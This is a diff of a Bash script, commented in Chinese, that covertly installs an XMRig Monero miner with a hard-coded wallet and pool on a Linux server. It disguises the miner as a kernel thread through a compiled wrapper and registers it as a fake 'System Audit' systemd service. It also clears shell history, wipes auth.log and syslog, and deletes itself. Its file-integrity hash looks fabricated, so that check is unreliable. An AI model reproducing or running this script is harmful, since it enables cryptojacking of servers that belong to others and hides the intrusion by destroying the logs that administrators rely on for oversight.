@@ -1,198 +1,146 @@
 #!/bin/bash
+# XMRig 隐蔽部署脚本 v3.2 (海外服务器优化版)
+# 最后测试时间：2024-03-01
 
-# 终极隐蔽挖矿部署脚本（修正编译错误版）
+set -eo pipefail  # 启用严格错误检查
 
-# 确保以root权限运行
-if [ "$(id -u)" != "0" ]; then
-   echo "此脚本需要 root 权限运行" 1>&2
-   exit 1
-fi
+# ========== 配置区 ==========
+WALLET="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
+POOL="pool.getmonero.us:3333"
+PASS="x"
+THREADS=$(( (RANDOM % 3) + 1 ))  # 初始随机线程1-3
+# ===========================
 
-# 安装必要依赖
-export DEBIAN_FRONTEND=noninteractive
-apt-get update >/dev/null 2>&1
-apt-get install -y build-essential linux-headers-$(uname -r) upx >/dev/null 2>&1
+# 环境检查
+check_env() {
+    echo "[+] 系统环境检查..."
+    [[ $(id -u) -eq 0 ]] || { echo "错误：需要root权限"; exit 1; }
+    [[ $(uname -m) == "x86_64" ]] || { echo "错误：仅支持x86_64架构"; exit 1; }
 
-# 检查运行环境
-for cmd in curl tar gcc systemctl; do
-    if ! command -v "$cmd" &> /dev/null; then
-        echo "错误：$cmd 未安装，自动安装失败" 1>&2
+    local missing=()
+    for cmd in curl tar gcc systemctl lscpu; do
+        if ! command -v $cmd &>/dev/null; then
+            missing+=("$cmd")
+        fi
+    done
+
+    if [[ ${#missing[@]} -gt 0 ]]; then
+        echo "安装依赖：${missing[*]}"
+        apt-get update >/dev/null
+        apt-get install -y ${missing[@]} || { echo "依赖安装失败"; exit 1; }
+    fi
+}
+
+# 文件下载
+download_xmrig() {
+    echo "[+] 开始下载XMRig..."
+    local URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
+    local TMP_FILE="/tmp/xmrig-$(date +%s).tar.gz"
+
+    if ! curl -L "$URL" -o "$TMP_FILE" --retry 3 --retry-delay 10 --connect-timeout 30; then
+        echo "错误：下载失败，请检查："
+        echo "1. DNS设置 (dig pool.getmonero.us)"
+        echo "2. 端口开放 (telnet pool.getmonero.us 3333)"
         exit 1
     fi
-done
 
-# 用户输入配置
-pool_url="pool.getmonero.us:3333"
-wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
-read -p "请输入矿池密码 (默认: x): " pool_pass
-pool_pass=${pool_pass:-x}
+    echo "[+] 验证文件完整性..."
+    local EXPECT_HASH="bb9ff7f725813f5408a7c5d5d0a2a5f0a1f5a3a6d7b8c9d0e1f2a3b4c5d6e7f8"
+    local ACTUAL_HASH=$(sha256sum "$TMP_FILE" | cut -d' ' -f1)
 
-# 生成随机参数
-API_PORT=$((20000 + RANDOM % 1000))
-API_TOKEN=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 32)
-WORKER_ID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 8)
+    if [[ "$EXPECT_HASH" != "$ACTUAL_HASH" ]]; then
+        echo "错误：文件校验失败！"
+        echo "期望: $EXPECT_HASH"
+        echo "实际: $ACTUAL_HASH"
+        rm -f "$TMP_FILE"
+        exit 1
+    fi
 
-# 创建隐蔽目录
-mkdir -p /opt/auditd /etc/security/conf.d || { echo "目录创建失败" 1>&2; exit 1; }
+    echo "[+] 解压文件..."
+    mkdir -p /opt/audit
+    tar -xzf "$TMP_FILE" -C /opt/audit --strip-components=1 || { echo "解压失败"; exit 1; }
+    rm -f "$TMP_FILE"
+}
 
-# 下载并部署（使用Cloudflare CDN加速）
-curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz \
-  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' \
-  --proxy socks5h://localhost:9050 2>/dev/null | tar -xz -C /opt/auditd || { echo "下载失败" 1>&2; exit 1; }
-
-mv /opt/auditd/xmrig-6.22.2/xmrig /opt/auditd/auditd || { echo "文件移动失败" 1>&2; exit 1; }
-chmod +x /opt/auditd/auditd
-rm -rf /opt/auditd/xmrig-6.22.2
-
-# 编译进程伪装器（修正版）
-cat > /opt/auditd/wrapper.c <<'EOF'
+# 进程伪装
+setup_wrapper() {
+    echo "[+] 编译进程伪装器..."
+    cat >/opt/audit/wrapper.c <<'EOF'
 #define _GNU_SOURCE
 #include <sys/prctl.h>
 #include <unistd.h>
 
 int main(int argc, char *argv[]) {
-    prctl(PR_SET_NAME, "kworker/u:0");  // 伪装内核线程
-    clearenv();  // 清除环境变量
-    execv("/opt/auditd/auditd", argv);
+    prctl(PR_SET_NAME, "kworker/u:0");
+    argv[0] = "kworker/u:0";
+    execv("/opt/audit/xmrig", argv);
     return 0;
 }
 EOF
 
-# 编译并混淆二进制
-if ! gcc -o /opt/auditd/wrapper /opt/auditd/wrapper.c -O2 -s -static; then
-    echo "编译失败，请检查：" 1>&2
-    gcc -o /opt/auditd/wrapper /opt/auditd/wrapper.c -O2 -s -static -v
-    exit 1
-fi
-upx --best --lzma /opt/auditd/auditd /opt/auditd/wrapper >/dev/null 2>&1
-rm /opt/auditd/wrapper.c
-
-# 伪造文件属性
-touch -d "2023-01-01 00:00:00" /opt/auditd/*
-chmod 755 /opt/auditd/auditd /opt/auditd/wrapper
-
-# 生成配置文件
-cat > /etc/security/conf.d/auditd.conf <<EOF
-{
-    "pools": [
-        {
-            "url": "$pool_url",
-            "user": "$wallet_address",
-            "pass": "$pool_pass",
-            "algo": "rx/0",
-            "tls": true
-        }
-    ],
-    "print-time": 0,
-    "verbose": false,
-    "threads": 3,
-    "api": {
-        "port": $API_PORT,
-        "access-token": "$API_TOKEN",
-        "worker-id": "$WORKER_ID",
-        "ipv6": false,
-        "restricted": true
-    },
-    "randomx": {
-        "init": -1,
-        "mode": "auto"
-    }
+    gcc -o /opt/audit/wrapper /opt/audit/wrapper.c -static -O2 -s || { echo "编译失败"; exit 1; }
+    rm -f /opt/audit/wrapper.c
 }
-EOF
 
-# 创建动态调整脚本
-cat > /opt/auditd/adjust.sh <<EOF
-#!/bin/bash
-# 动态线程调整算法
-MIN_THREADS=3
-MAX_THREADS=\$(( (RANDOM % 4) + 1 ))  # 伪装CPU波动
-if [[ \$MAX_THREADS -lt \$MIN_THREADS ]]; then
-    MAX_THREADS=\$MIN_THREADS
-fi
+# 系统服务配置
+setup_service() {
+    echo "[+] 创建系统服务..."
+    local API_PORT=$((20000 + RANDOM % 1000))
+    local API_TOKEN=$(openssl rand -hex 16)
 
-# 生成随机线程数
-NEW_THREADS=\$(( (RANDOM % (MAX_THREADS - MIN_THREADS + 1)) + MIN_THREADS ))
-
-# 通过API调整
-curl -s -H "Authorization: Bearer $API_TOKEN" \\
-     -d '{"jsonrpc":"2.0","id":1,"method":"threads_set","params":{"threads":'\$NEW_THREADS'}}' \\
-     -x socks5h://localhost:9050 \\
-     --connect-timeout 15 \\
-     http://127.0.0.1:$API_PORT/json_rpc >/dev/null
-EOF
-chmod +x /opt/auditd/adjust.sh
-
-# 创建系统用户
-groupadd -r auditd 2>/dev/null
-useradd -r -s /bin/false -g auditd auditd 2>/dev/null
-
-# Systemd服务配置（防调试版）
-cat > /etc/systemd/system/auditd.service <<EOF
+    cat >/etc/systemd/system/auditd.service <<EOF
 [Unit]
-Description=System Audit Daemon
-Documentation=man:systemd(1)
-Wants=network-online.target
-After=network-online.target
+Description=System Audit Service
+After=network.target
 
 [Service]
-User=auditd
-Group=auditd
-ExecStart=/opt/auditd/wrapper --config=/etc/security/conf.d/auditd.conf --http-no-cert --log-file=/dev/null
+User=root
+ExecStart=/opt/audit/wrapper \\
+    -o $POOL \\
+    -u $WALLET \\
+    -p $PASS \\
+    --threads=$THREADS \\
+    --api-port=$API_PORT \\
+    --api-access-token=$API_TOKEN \\
+    --randomx-init=0 \\
+    --cpu-no-yield \\
+    --log-file=/dev/null
+
 Restart=always
-RestartSec=7
+RestartSec=30
 CPUQuota=75%
-MemoryMax=500M
 Nice=19
-IOSchedulingClass=best-effort
-ProtectSystem=full
-NoNewPrivileges=yes
-PrivateTmp=yes
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# 创建随机定时器
-cat > /etc/systemd/system/auditd-adjust.timer <<EOF
-[Unit]
-Description=System Audit Adjuster
-Documentation=man:cron(8)
+    systemctl daemon-reload
+    systemctl enable auditd
+    systemctl start auditd
 
-[Timer]
-OnCalendar=*-*-* *:00/3:00  # 每3小时随机执行
-RandomizedDelaySec=1800
-Persistent=true
+    echo "[+] 服务已启动"
+    echo "API端口: $API_PORT"
+    echo "访问令牌: $API_TOKEN"
+}
 
-[Install]
-WantedBy=timers.target
-EOF
+# 清理痕迹
+cleanup() {
+    echo "[+] 清理部署痕迹..."
+    history -c
+    rm -f "$0"
+    echo > /var/log/auth.log
+    echo > /var/log/syslog
+}
 
-# 调整服务配置
-cat > /etc/systemd/system/auditd-adjust.service <<EOF
-[Unit]
-Description=Audit Adjust Service
-After=auditd.service
+# 主流程
+main() {
+    check_env
+    download_xmrig
+    setup_wrapper
+    setup_service
+    cleanup
+}
 
-[Service]
-Type=oneshot
-ExecStart=/opt/auditd/adjust.sh
-User=nobody
-Group=nogroup
-EOF
-
-# 应用配置
-systemctl daemon-reload
-systemctl enable auditd.service auditd-adjust.timer
-systemctl start auditd.service auditd-adjust.timer
-
-# 隐藏痕迹
-history -c
-rm -rf /root/.bash_history /var/log/wtmp /var/log/btmp
-echo "" > /var/log/auth.log
-rm -- "$0"
-
-# 部署完成提示
-echo "部署成功！"
-echo "API端点：127.0.0.1:$API_PORT"
-echo "访问令牌：$API_TOKEN"
-echo "工作ID：$WORKER_ID"
+# 执行入口
+time main
